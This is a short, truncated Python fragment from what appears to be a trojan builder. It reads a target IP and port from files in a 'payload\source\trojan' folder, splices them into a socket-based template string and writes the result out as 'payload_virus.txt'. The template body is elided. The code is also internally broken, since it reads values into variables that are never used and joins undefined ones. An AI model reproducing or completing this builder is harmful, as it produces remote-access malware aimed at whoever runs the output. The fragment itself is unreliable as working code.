...
login=os.getlogin()
location=os.getcwd()
he=open(str(location)+R"\payload\source\trojan\port.txt","r").read()
name=open(str(location)+R"\payload\source\trojan\ip.txt","r").read()
location=os.getcwd()
text="""
import os
import socket
...
full_text=str(text)+str(ip)+str(port)+str(text2)

file159=open(str(location)+R"\payload\source\payload_virus.txt","w").write(str(full_text))
